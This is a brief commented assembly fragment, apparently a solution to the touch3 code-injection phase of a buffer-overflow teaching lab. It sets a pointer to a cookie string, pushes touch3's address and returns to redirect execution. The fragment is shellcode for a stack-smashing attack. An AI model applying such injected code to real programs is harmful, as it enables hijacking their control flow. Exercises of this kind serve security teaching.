# Pass a pointer to the cookie string to <touch3>
movl $0x5561e618,%edi
# Set return address to that of <touch3>
pushq $0x0000000000401a9c
# Return (go to <touch3>)
retq
